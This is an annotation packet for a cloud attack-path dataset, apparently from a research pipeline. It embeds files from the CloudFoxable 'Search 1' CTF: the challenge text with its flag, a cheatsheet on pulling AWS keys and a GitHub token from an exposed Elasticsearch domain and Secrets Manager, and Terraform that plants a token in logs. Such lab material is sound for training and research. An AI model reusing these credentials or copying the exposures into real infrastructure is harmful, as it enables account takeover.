@@ -1,0 +1,110 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "ec5c0b24b7292522084391ee78937f5f2a7b67412e48866cdb4aa4cba3dd68cf",
+  "case_id": "cloudfoxable:aws:Search 1",
+  "role": "primary",
+  "annotator_id": "annotator_01",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudfoxable",
+    "upstream_url": "https://github.com/BishopFox/cloudfoxable",
+    "version_or_commit": "fc49b7f637268031515ced9fee4b643d3e68db67",
+    "license": "MIT",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudfoxable/fc49b7f637268031515ced9fee4b643d3e68db67/snapshot.zip",
+        "sha256": "bec9436f0e8759601dd7669c108c0921db5b10bc2d941223f0467efb5227fe6d"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudfoxable:aws:Search 1",
+    "kind": "executable_challenge",
+    "platform": "AWS",
+    "challenge": "Search 1",
+    "manifest_path": "cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/challenge.yml",
+    "terraform_file_count": 2,
+    "raw_ref": "snapshot.zip#cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/",
+    "review_score": 30,
+    "independence_group": "cloudfoxable-challenge:Search 1",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/README.md",
+      "member_path": "cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/README.md",
+      "member_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "bytes": 0,
+      "content_kind": "md",
+      "text": "",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/challenge.yml",
+      "member_path": "cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/challenge.yml",
+      "member_sha256": "f28e2d9eae11c55c75823c9229a06429ac5a4bd2465fded4ff6c0458e63ee67d",
+      "bytes": 1360,
+      "content_kind": "yml",
+      "text": "name: Search 1\ncategory: Exploit Public-Facing Application\ndescription: |-\n  **Overview**\n\n  - **Default state:** Disabled\n  - **Estimated Cost:** $27/month\n  - **Starting Point:** `arn:aws:iam::ACCOUNT_ID:user/ctf-starting-user`\n\n  **CloudFoxable Setup**\n\n  - Edit `cloudfoxable/aws/terraform.tfvars`\n  - Switch the challenge flag to true: `search1and2_enabled = true`\n  - Run `terraform apply`\n\n  **Challenge**\n\n  As a cloud penetration tester, you need to look at more than just EC2 IP addresses for things to attack. There are services that are only accessible via AWS hostnames or custom DNS that map to those AWS hostnames. Find the Elasticsearch domain that is exposed to the world (really only your IP address). Find the endpoint and see if you can find any flags... or next steps... or both!\n\n  **Cleanup Tasks**\n\n  - Edit `cloudfoxable/aws/terraform.tfvars`\n  - Switch the challenge flag to false: `search1and2_enabled = false`\n  - Run `terraform apply`\nvalue: 100\n\nflags:\n- content: FLAG{search1::You_will_find_the_craziest_stuff_in_elasticsearch_sometimes}\n  type: static\n  data: case_insensitive\n\nhints:\n- |-\n  Use `cloudfox aws endpoints` to help you find ElasticSearch/OpenSearch domain\n- >-\n  Checkout https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch\n  for tips on interacting with opensearch/elasticsearch\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/cheatsheet.md",
+      "member_path": "cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/cheatsheet.md",
+      "member_sha256": "abf7b52e76fcd54b5bcdda20f37fec66e87cc8293b76cb468564e72a7a24105c",
+      "bytes": 1811,
+      "content_kind": "md",
+      "text": "#### Run cloudfox endpoints\n❯ cloudfox aws -p cloudfoxable_start endpoints -v2\n\n#### Browse to opensearch endpoint (exposed to only your IP with no authentication)\nhttps://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/\n\n#### find flag \nhttps://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&q=flag\nor\nhttps://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&size=100\n\n#### find key\nhttps://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&q=key_id\nor\nhttps://search-example-x7fmapx6yfr23auv6in2h3u7ge.us-west-2.es.amazonaws.com/_search?pretty=true&size=100\n\n### set found keys and call get-caller-identity\n\n❯ export AWS_ACCESS_KEY_ID=AKIAQXHJKLZKKBSKZR5T\n❯ export AWS_SECRET_ACCESS_KEY=harXmptWK/vdcmroXgDvN++7rCK3HfleU76hGY0o\n❯ aws sts get-caller-identity\n{\n    \"UserId\": \"AIDAQXHJKLZKOOMTQT72R\",\n    \"Account\": \"049881439828\",\n    \"Arn\": \"arn:aws:iam::049881439828:user/Xavi\"\n}\n\n#### Find permisisons for Xavi\n\n❯ cloudfox aws -p cloudfoxable_start permissions -v2 --principal Xavi\n\n\n### Read the DB you hvae access to\n\naws --region us-west-2 dynamodb scan --table-name example-table\n\n### Find flag\n\n\n### Access the cloudfox secrets loot file\n❯ cat pull-secrets-commands.txt\naws --profile $profile --region us-west-2 secretsmanager get-secret-value --secret-id github-pat\n\nexport profile=ml-engineering\n\n\n❯ aws --profile $profile --region us-west-2 secretsmanager get-secret-value --secret-id github-pat\n\n### Install gh command line tool and authenticate with token\n\necho TOKEN_VALUE > token\ngh auth login --with-token < token\ngh repo list\n\n## Find the private repo and clone it\n\n❯ gh repo clone cloudfoxable/super-secret-ML-stuff\n\n## Find the flag\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/search1and2.tf",
+      "member_path": "cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/search1and2.tf",
+      "member_sha256": "302fa392992ae17ea9dd76c9b4ef5094df178f01918384923982bf3d6be1bdd4",
+      "bytes": 2504,
+      "content_kind": "tf",
+      "text": "locals {\n  base64_encoded_pat = \"Z2l0aHViX3BhdF8xMUE3UEdORVEwUHhZTFNNNm1MWnplXzlTZnBDeFVZV0ZycXJEMlp0V2NZZjRySmFEYkNKMXQ5S0VCUWNOUUM5VjNSUElZT1VST0sxQzl5WTdKCg==\"\n}\n\nresource \"aws_elasticsearch_domain\" \"pat\" {\n  domain_name           = \"pat\"\n  elasticsearch_version = \"7.9\"\n\n  cluster_config {\n    instance_type = \"t2.small.elasticsearch\"\n    instance_count = 1\n  }\n\n  ebs_options {\n    ebs_enabled = true\n    volume_size = 10\n  }\n\n  snapshot_options {\n    automated_snapshot_start_hour = 23\n  }\n\n  access_policies = jsonencode({\n    \"Version\" = \"2012-10-17\"\n    \"Statement\" = [\n      {\n        \"Effect\" = \"Allow\"\n        \"Principal\" = {\n          \"AWS\" = \"*\"\n        }\n        \"Action\" = [\n          \"es:ESHttpGet\",\n          \"es:ESHttpHead\",\n          \"es:ESHttpPost\"\n        ]\n      \n\n        \"Resource\" = \"*\"\n        \"Condition\" = {\n          \"IpAddress\" = {\n            \"aws:SourceIp\" = \"${var.user_ip}/32\"\n          }\n        }\n      }\n    ]\n  })\n\n\n}\n\noutput \"pat_domain_endpoint\" {\n  value = aws_elasticsearch_domain.pat.endpoint\n}\n\nresource \"null_resource\" \"upload_logs\" {\n  triggers = {\n    pat_domain_endpoint = aws_elasticsearch_domain.pat.endpoint\n  }\n\n  provisioner \"local-exec\" {\n    command = <<-EOT\n      curl -X POST \"${aws_elasticsearch_domain.pat.endpoint}/webserver-logs/_doc/\" -H 'Content-Type: application/json' -d '{\"timestamp\": \"2023-04-25T01:02:00Z\", \"log\": \"192.0.2.44 - - [25/Apr/2023:01:02:00 +0000] \\\"GET /app/database HTTP/1.1\\\" 200 7189\", \"source_ip\": \"192.0.2.44\"}' && \\\n      curl -X POST \"${aws_elasticsearch_domain.pat.endpoint}/webserver-logs/_doc/\" -H 'Content-Type: application/json' -d '{\"timestamp\": \"2023-04-25T01:00:00Z\", \"log\": \"192.0.2.42 - - [25/Apr/2023:01:04:00 +0000] \\\"GET /app/login?session_id=abc123&ctf_flag=FLAG{search1::You_will_find_the_craziest_stuff_in_elasticsearch_sometimes} HTTP/1.1\\\" 200 5123\", \"source_ip\": \"192.0.2.4\"}' && \\\n      curl -X POST \"${aws_elasticsearch_domain.pat.endpoint}/webserver-logs/_doc/\" -H 'Content-Type: application/json' -d '{\"timestamp\": \"2023-04-25T01:01:00Z\", \"log\": \"192.0.2.43 - - [25/Apr/2023:01:01:00 +0000] \\\"GET /app/data?token=${local.base64_encoded_pat} HTTP/1.1\\\" 200 6145\", \"source_ip\": \"192.0.2.43\"}' && \\\n      curl -X POST \"${aws_elasticsearch_domain.pat.endpoint}/webserver-logs/_doc/\" -H 'Content-Type: application/json' -d '{\"timestamp\": \"2023-04-25T01:02:00Z\", \"log\": \"192.0.2.44 - - [25/Apr/2023:01:02:00 +0000] \\\"GET /app/profile HTTP/1.1\\\" 200 7189\", \"source_ip\": \"192.0.2.44\"}'\n    EOT\n  }\n}\n\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/variables.tf",
+      "member_path": "cloudfoxable-fc49b7f637268031515ced9fee4b643d3e68db67/aws/challenges/Search 1/variables.tf",
+      "member_sha256": "93c5a64f039c05fcf9664b0925105aa1d256caf76a3c3519ecb2afa3bbf40ea0",
+      "bytes": 1974,
+      "content_kind": "tf",
+      "text": "variable \"aws_local_profile\" {\r\n  description = \"What local profile should terraform use to interact with your AWS account(s)\"\r\n  type        = string\r\n  default     = \"default\"\r\n}\r\n\r\nvariable \"aws_local_creds_file\" {\r\n  description = \"Location of your local credentials file\"\r\n  type        = string\r\n  default     = \"~/.aws/credentials\"\r\n}\r\n\r\nvariable \"aws_assume_role_arn\" {\r\n  description = \"This is the arn of an already existing principal that can assume into any roles that are created\"\r\n  type        = string\r\n  default     = \"\"\r\n}\r\n\r\nvariable \"account_id\" {\r\n  description = \"This is the ID of the caller account\"\r\n  type        = string\r\n  default     = \"\"\r\n}\r\n\r\n\r\nvariable \"shared_high_priv_servicerole\" {\r\n  description = \"This is the arn of high priv service role that is attached to lambda's ec2's, etc. to facilitate privesc\"\r\n  type        = string\r\n  default     = \"\"\r\n}\r\n\r\nvariable \"AWS_REGION\" {\r\n  type    = string\r\n  default = \"us-west-2\"\r\n}\r\n\r\n\r\n# Resources\r\nresource \"random_password\" \"database-secret\" {\r\n  length           = 31\r\n  special          = true\r\n  min_special      = 5\r\n  override_special = \"!#$%^&*()-_=+[]{}<>:?\"\r\n  keepers = {\r\n    pass_version = 1\r\n  }\r\n}\r\n\r\nresource \"random_password\" \"app-secret\" {\r\n  length           = 31\r\n  special          = true\r\n  min_special      = 5\r\n  override_special = \"!#$%^&*()-_=+[]{}<>:?\"\r\n  keepers = {\r\n    pass_version = 1\r\n  }\r\n}\r\n\r\nresource \"random_string\" \"resource-suffix\" {\r\n  length           = 5 \r\n  upper = false \r\n  special = false\r\n}\r\n\r\nvariable \"user_ip\" {\r\n  description = \"The current user's IP address\"\r\n  type        = string\r\n  default     = \"\"\r\n}\r\n\r\nvariable \"ctf_starting_user_arn\" {\r\n  description = \"The arn of the user that is created at the start of the CTF\"\r\n  type        = string\r\n  default     = \"\"\r\n}\r\n\r\nvariable \"ctf_starting_user_name\" {\r\n  description = \"The name of the user that is created at the start of the CTF\"\r\n  type        = string\r\n  default     = \"\"\r\n}\r\n\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "7f499d604204d7fd6dc4832a334a0e58ef9d61c762606ba355b8cc9109bdc0e9",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
